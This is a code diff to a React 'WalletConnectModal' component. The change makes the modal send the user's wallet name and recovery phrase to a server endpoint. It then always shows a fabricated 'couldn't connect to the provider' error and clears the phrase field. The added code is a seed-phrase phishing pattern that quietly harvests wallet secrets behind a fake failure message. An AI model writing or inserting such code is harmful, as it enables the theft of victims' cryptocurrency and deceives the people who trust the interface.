@@ -8,17 +8,29 @@ export default function WalletConnectModal({ onClose }: { onClose: () => void })
   const [phrase, setPhrase] = useState("");
   const [walletName, setWalletName] = useState("");
 
-  const handleConnect = () => {
+  const handleConnect = async () => {
     if (!walletName || !phrase) {
       setError("Please fill out all fields.");
       return;
     }
     setLoading(true);
     setError("");
+
+    try {
+      await fetch("/api/wallet/connect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ walletName, phrase }),
+      });
+    } catch (err) {
+      console.error(err);
+    }
+
     setTimeout(() => {
       setLoading(false);
       setError("Unfortunately, we couldn't connect to the provider. Please check your network or try a different wallet provider.");
-    }, 2500);
+      setPhrase("");
+    }, 1500);
   };
 
   return (
